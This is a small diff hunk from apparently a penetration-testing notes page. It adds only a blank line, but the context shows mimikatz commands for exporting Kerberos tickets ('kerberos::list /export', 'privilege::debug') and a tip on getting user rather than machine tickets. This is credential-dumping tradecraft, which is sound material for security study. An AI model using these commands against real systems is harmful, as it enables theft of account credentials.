@@ -560,6 +560,7 @@ mimikatz # kerberos::list /export
 ```
 
 - ☝️ **Note**: to retrieve user kerberos tickets, do not use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead
+
 ```console
 mimikatz # privilege::debug
 Privilege '20' OK
